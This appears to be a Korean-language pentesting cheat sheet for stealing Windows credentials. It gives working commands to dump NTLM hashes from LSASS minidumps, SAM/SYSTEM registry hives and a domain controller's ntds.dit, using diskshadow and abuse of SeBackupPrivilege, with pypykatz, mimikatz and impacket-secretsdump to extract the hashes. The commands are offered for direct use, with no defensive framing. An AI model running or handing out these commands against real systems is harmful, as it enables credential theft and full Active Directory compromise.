### DMP 파일 복원하기
```bash
pypykatz lsa minidump lsass.DMP > lsass.txt
# 덤프파일에서 ntlm 해시만 추출
cat lsass.txt | grep "NT" | awk -F: '{print $2}' | sort | uniq > ntlm.hash
```



### Local Exploit
#### Dump
```bash
# SAM, SYSTEM 덤프
reg save HKLM\SYSTEM system.hive
reg save HKLM\SAM sam.hive
```
#### Mimikatz
```bash
lsadump::sam /system:system.hive /sam:sam.hive
```
#### impacket-secretsdump.py
```bash
impacket-secretsdump -sam '/path/to/sam.save' -system '/path/to/system.save' LOCAL
impacket-secretsdump -sam '/path/to/sam.save' -security '/path/to/security.save' -system '/path/to/system.save' LOCAL
```
#### pypykatz
```bash
pypykatz registry --sam sam system
```

### Active Directory Exploit 1
#### Make l8bl.dsh
```powershell
set context persistent nowriters
add volume c: alias l8bl
create
expose %l8bl% z:
```
#### Making diskshadow and dump
```powershell
# Make temp directory
mkdir temp
# upload l8bl.dsh
upload l8bl.dsh
# Make diskshadow with l8bl.dsh
diskshadow /s l8bl.dsh
# copy ntds from diskshadow
robocopy /b z:\windows\ntds . ntds.dit
# save SYSTEM
reg save hklm\system C:\temp\system
# download ntds and SYSTEM
download ntds.dit
download system

```
#### impacket-secretsdump.py
```powershell
impacket-secretsdump -ntds ntds.dit -system system local
```

### Active Directory Exploit 2
#### Using dll
https://github.com/giuliano108/SeBackupPrivilege
```bash
# Make temp directory
cd C:\Temp
# Upload l8bl.dsh and dlls
upload l8bl.dsh
upload SeBackupPrivilegeUtils.dll
upload SeBackupPrivilegeCmdLets.dll
# Creating the Backup
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
diskshadow /s l8bl.dsh
# Copy ntds and save system
Copy-FileSebackupPrivilege z:\Windows\NTDS\ntds.dit C:\Temp\ntds.dit
reg save hklm\system c:\Temp\system
# Download ntds and system
download ntds.dit
download system

```

#### impacket-secretsdump.py
```powershell
impacket-secretsdump -ntds ntds.dit -system system local
impacket-secretsdump -sam 'sam.hive' -system 'system.hive' LOCAL
```
